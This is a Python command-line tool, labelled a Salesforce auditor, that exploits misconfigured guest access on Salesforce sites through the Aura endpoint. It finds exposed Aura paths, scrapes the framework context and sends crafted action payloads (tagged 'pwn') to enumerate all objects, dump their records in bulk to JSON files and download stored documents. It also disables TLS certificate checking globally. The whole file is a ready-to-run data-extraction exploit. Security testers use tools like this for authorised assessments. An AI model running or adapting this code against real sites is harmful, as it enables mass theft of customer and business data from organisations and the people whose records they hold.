import argparse
import json
import logging
import os
import re
import sys
import ssl
from urllib.parse import urljoin, urlparse, unquote
from email.message import Message

import requests

ssl._create_default_https_context = ssl._create_unverified_context

# --- Constants and Configuration ---
AURA_PATH_PATTERNS = [
    "aura",
    "s/aura",
    "s/sfsites/aura",
    "sfsites/aura"
]

PAYLOAD_PULL_CUSTOM_OBJ = {
    "actions": [
        {
            "id": "pwn",
            "descriptor": "serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData",
            "callingDescriptor": "UNKNOWN",
            "params": {}
        }
    ]
}

DEFAULT_PAGE_SIZE = 100
MAX_PAGE_SIZE = 1000

# Setup basic logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# --- Main Salesforce Auditing Class ---
class SalesforceAuditor:
    """
    A class to audit Salesforce sites for potential data exposure via the Aura framework.
    """

    def __init__(self, base_url, proxy=None):
        self.base_url = self._normalize_url(base_url)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36'
        })
        self.aura_endpoint = None
        self.aura_context = None

        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy,
            }

    def _normalize_url(self, url):
        """
        Ensures the URL has a scheme and trailing slash.
        """
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        if not url.endswith('/'):
            url += '/'
        return url

    def find_aura_endpoint(self):
        """
        Checks for vulnerable Aura endpoints.
        """
        logging.info("🔎 Looking for Aura endpoints and checking for vulnerability.")
        for path in AURA_PATH_PATTERNS:
            endpoint_url = urljoin(self.base_url, path)
            try:
                response = self.session.post(endpoint_url, data={}, timeout=10)
                if "aura:invalidSession" in response.text:
                    self.aura_endpoint = endpoint_url
                    logging.info(f"✅ Found vulnerable endpoint: {self.aura_endpoint}")
                    return True
            except requests.exceptions.RequestException as e:
                logging.warning(f"❗ Failed to connect to {endpoint_url}: {e}")
        
        logging.error("❌ No vulnerable Aura endpoints found.")
        return False

    def get_aura_context(self):
        """
        Retrieves the necessary Aura context (fwuid, markup, app).
        """
        logging.info("🧠 Retrieving Aura context from the main page.")
        if not self.base_url:
            logging.error("No base URL provided.")
            return False

        try:
            response = self.session.get(self.base_url, timeout=10)
            response.raise_for_status()

            if "window.location.href" in response.text:
                redirect_url_match = re.search(r"window\.location\.href\s*=\s*'([^']+)'", response.text)
                if redirect_url_match:
                    redirect_url = redirect_url_match.group(1)
                    response = self.session.get(redirect_url, timeout=10)
                    response.raise_for_status()

            aura_encoded = re.search(r'/s/sfsites/l/([^\/]+fwuid[^\/]+)', response.text)
            if aura_encoded:
                response_body = unquote(aura_encoded.group(1))
            else:
                response_body = response.text

            fwuid = re.search(r'"fwuid":"([^"]+)', response_body)
            markup = re.search(r'"(APPLICATION@markup[^"]+)":"([^"]+)"', response_body)
            app = re.search(r'"app":"([^"]+)', response_body)

            if not all([fwuid, markup, app]):
                logging.error("Could not extract Aura context components (fwuid, markup, app).")
                return False

            self.aura_context = json.dumps({
                "mode": "PROD",
                "fwuid": fwuid.group(1),
                "app": app.group(1),
                "loaded": {markup.group(1): markup.group(2)},
                "dn": [],
                "globals": {},
                "uad": False
            })
            logging.info("✅ Successfully retrieved Aura context.")
            return True

        except requests.exceptions.RequestException as e:
            logging.error(f"❌ Failed to get Aura context from {self.base_url}: {e}")
            return False

    def _create_payload_for_getItems(self, object_name, page_size, page):
        """
        Creates a payload to fetch a list of records for a given object.
        """
        payload = {
            "actions": [
                {
                    "id": "pwn",
                    "descriptor": "serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems",
                    "callingDescriptor": "UNKNOWN",
                    "params": {
                        "entityNameOrId": object_name,
                        "layoutType": "FULL",
                        "pageSize": page_size,
                        "currentPage": page,
                        "useTimeout": False,
                        "getCount": True,
                        "enableRowActions": False
                    }
                }
            ]
        }
        return json.dumps(payload)

    def _create_payload_for_getRecord(self, record_id):
        """
        Creates a payload to fetch a single record by its ID.
        """
        payload = {
            "actions": [
                {
                    "id": "pwn",
                    "descriptor": "serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord",
                    "callingDescriptor": "UNKNOWN",
                    "params": {
                        "recordId": record_id,
                        "record": None,
                        "inContextOfComponent": "",
                        "mode": "VIEW",
                        "layoutType": "FULL",
                        "defaultFieldValues": None,
                        "navigationLocation": "LIST_VIEW_ROW"
                    }
                }
            ]
        }
        return json.dumps(payload)

    def _exploit_aura_endpoint(self, payload_dict):
        """
        Sends the exploit payload to the Aura endpoint.
        """
        if not self.aura_endpoint or not self.aura_context:
            logging.error("Aura endpoint or context not set. Cannot exploit.")
            return None

        url = f"{self.aura_endpoint}?r=1&applauncher.LoginForm.getLoginRightFrameUrl=1"
        data = {
            'message': payload_dict,
            'aura.context': self.aura_context,
            'aura.token': 'undefined'
        }

        try:
            response = self.session.post(url, data=data, timeout=30)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            logging.error(f"❌ HTTP request failed: {e}")
            return None
        except json.JSONDecodeError:
            logging.error(f"❌ Failed to decode JSON from response: {response.text[:200]}...")
            return None

    def pull_object_list(self):
        """
        Fetches a list of all custom and standard objects.
        """
        logging.info("📦 Pulling the list of all available Salesforce objects.")
        response = self._exploit_aura_endpoint(json.dumps(PAYLOAD_PULL_CUSTOM_OBJ))

        if not response or response.get('exceptionEvent'):
            logging.error("❌ Failed to pull object list.")
            return []

        try:
            object_dict = response.get("actions")[0].get("returnValue").get("apiNamesToKeyPrefixes")
            if not object_dict:
                logging.warning("No objects found in the response.")
                return []
            
            all_objects = list(object_dict.keys())
            standard_objects = [obj for obj in all_objects if not obj.endswith("__c")]
            custom_objects = [obj for obj in all_objects if obj.endswith("__c")]

            logging.info(f"✅ Found {len(all_objects)} total objects.")
            logging.info(f"Standard Objects: {standard_objects}")
            logging.info(f"Custom Objects: {custom_objects}")
            
            return all_objects
        except (KeyError, IndexError) as e:
            logging.error(f"❌ Failed to parse object list from response: {e}")
            return []

    def dump_single_record(self, record_id):
        """
        Dumps a single record by its ID.
        """
        logging.info(f"📖 Dumping record with ID: {record_id}")
        payload = self._create_payload_for_getRecord(record_id)
        response = self._exploit_aura_endpoint(payload)
        
        if not response or response.get('actions')[0].get('state') != 'SUCCESS':
            logging.error(f"❌ Failed to dump record {record_id}.")
            return

        record_data = response.get('actions')[0].get('returnValue')
        logging.info(f"✅ Successfully dumped record {record_id}.")
        print(json.dumps(record_data, ensure_ascii=False, indent=2))

    def dump_object_data(self, object_name, page_size, page):
        """
        Dumps data for a specific object and page.
        """
        logging.info(f"📚 Dumping '{object_name}' (page {page}, size {page_size})...")
        payload = self._create_payload_for_getItems(object_name, page_size, page)
        response = self._exploit_aura_endpoint(payload)

        if not response:
            logging.error("❌ Failed to get object data.")
            return None

        try:
            action = response.get('actions')[0]
            state = action.get('state')
            if state == 'ERROR':
                logging.error(f"❌ Error for object '{object_name}': {action.get('error')[0]}")
                return None
            
            return_value = action.get('returnValue')
            if return_value and return_value.get('result'):
                total_count = return_value.get('totalCount')
                current_count = len(return_value['result'])
                logging.info(f"✅ Found {current_count} records (Total: {total_count}).")
                return return_value
            else:
                logging.warning(f"❗ No records found for '{object_name}'.")
                return None

        except (KeyError, IndexError) as e:
            logging.error(f"❌ Failed to parse response for '{object_name}': {e}")
            return None

    def dump_and_save_all_objects(self, output_dir, full_dump, skip_existing):
        """
        Dumps all available objects and saves the data to files.
        """
        all_objects = self.pull_object_list()
        if not all_objects:
            return

        page_size = MAX_PAGE_SIZE if full_dump else DEFAULT_PAGE_SIZE

        os.makedirs(output_dir, exist_ok=True)
        dumped_objects_count = 0

        for object_name in all_objects:
            output_file_path = os.path.join(output_dir, f"{object_name}.json")
            if skip_existing and os.path.exists(output_file_path):
                logging.info(f"⏩ Skipping '{object_name}', file already exists.")
                continue

            page = 1
            all_records = []
            
            while True:
                response_data = self.dump_object_data(object_name, page_size, page)
                if not response_data or not response_data.get('result'):
                    break
                
                all_records.extend(response_data['result'])
                
                # Check for files to download if it's a ContentDocument or Document object
                if object_name in ("ContentDocument", "Document"):
                    self._download_files(response_data['result'], output_dir)
                
                if not full_dump or len(response_data['result']) < page_size:
                    break
                
                page += 1

            if all_records:
                try:
                    with open(output_file_path, "w", encoding="utf-8") as fw:
                        json.dump(all_records, fw, ensure_ascii=False, indent=2)
                    logging.info(f"💾 Saved {len(all_records)} records to {output_file_path}")
                    dumped_objects_count += 1
                except Exception as e:
                    logging.error(f"❌ Failed to save data for '{object_name}': {e}")
        
        logging.info(f"🎉 Dumping finished. Successfully dumped {dumped_objects_count} objects.")

    def _download_files(self, records, output_dir):
        """
        Downloads files from ContentDocument or Document records.
        """
        download_dir = os.path.join(output_dir, "Downloaded_Files")
        os.makedirs(download_dir, exist_ok=True)

        for record in records:
            try:
                record_id = record['record']['Id']
                download_url = f"{self.base_url}/sfc/servlet.shepherd/document/download/{record_id}"
                
                response = self.session.get(download_url, allow_redirects=True, stream=True)
                response.raise_for_status()

                content_disposition = response.headers.get('Content-Disposition')
                if not content_disposition:
                    logging.warning(f"No Content-Disposition header for record {record_id}. Skipping.")
                    continue

                msg = Message()
                msg['Content-Disposition'] = content_disposition
                filename = msg.get_param('filename')
                
                if filename:
                    file_path = os.path.join(download_dir, filename)
                    logging.info(f"📥 Downloading '{filename}'...")
                    with open(file_path, 'wb') as f:
                        for chunk in response.iter_content(chunk_size=8192):
                            f.write(chunk)
                    logging.info(f"✅ Downloaded '{filename}' to {file_path}")
                else:
                    logging.warning(f"Could not get filename for record {record_id}.")

            except requests.exceptions.RequestException as e:
                logging.error(f"❌ Failed to download file for record {record_id}: {e}")
            except KeyError as e:
                logging.error(f"❌ Missing key in record data: {e}")

# --- Command-line Interface ---
def init():
    """
    Initializes and parses command-line arguments.
    """
    parser = argparse.ArgumentParser(
        description='A robust tool to audit Salesforce sites via the Aura endpoint with guest privileges.',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-u', '--url', required=True, help='The base URL of the Salesforce site. e.g., https://example.my.site.com/')
    
    group_action = parser.add_mutually_exclusive_group(required=True)
    group_action.add_argument('-c', '--check', action='store_true', help='Only check for a vulnerable Aura endpoint.')
    group_action.add_argument('-l', '--listobj', action='store_true', help='Pull a list of all accessible objects.')
    group_action.add_argument('-d', '--dump', action='store_true', help='Dump all accessible objects to files.')
    group_action.add_argument('-r', '--record_id', help='Dump a single record by its ID.')
    group_action.add_argument('-o', '--objects', nargs='+', metavar='OBJECT_NAME',
                              help='Specify one or more objects to dump (e.g., "User" "Account").')
    
    parser.add_argument('-f', '--full', action='store_true', help='When used with -d, dumps all pages of objects.')
    parser.add_argument('-s', '--skip', action='store_true', help='When used with -d, skips objects that have already been dumped.')
    parser.add_argument('-p', '--proxy', help='Use an HTTP/SOCKS proxy (e.g., http://127.0.0.1:8080).')

    return parser.parse_args()


if __name__ == "__main__":
    args = init()

    auditor = SalesforceAuditor(args.url, args.proxy)
    
    if not auditor.find_aura_endpoint():
        sys.exit(1)
        
    if args.check:
        sys.exit(0)

    if not auditor.get_aura_context():
        sys.exit(1)

    try:
        if args.listobj:
            auditor.pull_object_list()
        elif args.record_id:
            auditor.dump_single_record(args.record_id)
        elif args.dump:
            url_parts = urlparse(args.url)
            sanitized_url = f"{url_parts.netloc.replace(':', '_')}_{url_parts.path.strip('/').replace('/', '_')}"
            output_dir = os.path.join(os.getcwd(), sanitized_url)
            auditor.dump_and_save_all_objects(output_dir, args.full, args.skip)
        elif args.objects:
            for obj_name in args.objects:
                response_data = auditor.dump_object_data(obj_name, DEFAULT_PAGE_SIZE, 1)
                if response_data:
                    print(json.dumps(response_data.get('result'), ensure_ascii=False, indent=2))
                    if obj_name in ("ContentDocument", "Document"):
                        auditor._download_files(response_data['result'], os.getcwd())
    except Exception as e:
        logging.critical(f"An unexpected error occurred: {e}")
        sys.exit(1)
